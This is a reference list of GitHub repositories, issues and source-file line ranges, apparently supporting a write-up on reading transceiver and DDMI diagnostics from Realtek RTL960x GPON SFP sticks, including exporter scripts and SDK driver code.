- [Anime4000/RTL960x](https://github.com/Anime4000/RTL960x) — [issue #99](https://github.com/Anime4000/RTL960x/issues/99) (`diag pon get transceiver`), [`Docs/StickSetup.md`](https://github.com/Anime4000/RTL960x/blob/main/Docs/StickSetup.md) (telnet_open.asp, flash-set-needs-reboot), [`Firmware/UF-Instant/extracted/flash_all.xml`](https://github.com/Anime4000/RTL960x/blob/main/Firmware/UF-Instant/extracted/flash_all.xml) (SERVICE_SSH_ENABLE), [`WebGui/kitamon/main.py`](https://github.com/Anime4000/RTL960x/blob/main/WebGui/kitamon/main.py) (Boa-scrape exporter), [issue #87](https://github.com/Anime4000/RTL960x/issues/87), [issue #211](https://github.com/Anime4000/RTL960x/issues/211), [issue #440](https://github.com/Anime4000/RTL960x/issues/440)
- [Strykar/GPON](https://github.com/Strykar/GPON) — [`gpon_exporter.py`](https://github.com/Strykar/GPON/blob/main/gpon_exporter.py) (PROBES 867-874, parsers 490-504, fetch loop 897-950), [`docs/QUIRKS.md`](https://github.com/Strykar/GPON/blob/main/docs/QUIRKS.md) (omci_app/dropbear wedges, diag CLI ref), [`docs/omcicli_probes.md`](https://github.com/Strykar/GPON/blob/main/docs/omcicli_probes.md) (ANI-G probe), [commit `07fe841`](https://github.com/Strykar/GPON/commit/07fe841) (original Boa scraper), [issue #3](https://github.com/Strykar/GPON/issues/3)
- [jameywine/GPL-for-GP3000](https://github.com/jameywine/GPL-for-GP3000) (leaked europa SDK) — `linux-5.10.x/drivers/net/ethernet/realtek/rtl86900/sdk/src/rtk/ponmac.c:50-59,472-508` (transceiver_get + addr table), `rtk/i2c.c:346-359` (rtk_i2c_read), `rtk/ldd.c:147-159` (rtk_ldd_parameter_get, error path), `app/diag_rtk/src/diag_ponmac.c:1230-1288` (`pon get transceiver`), `app/diag_rtk/src/diag_i2c.c:308-384` (`i2c get`), `app/diag_rtk/src/diag_debug.c:16618-16698,17009-17016,17021+` (`debug europa dump/get/set`), `app/europa/drv_8291/europa_main.c:273-292,446-448` (commented polling thread), `app/europa/drv_8291/ddmi.c:400-449` (full A2 layout + threshold logic), `app/europa/src/europa_8291.c:130-168` (cal regression), `module/gpon/gpon_res.c:2212-2229` (kernel caller)
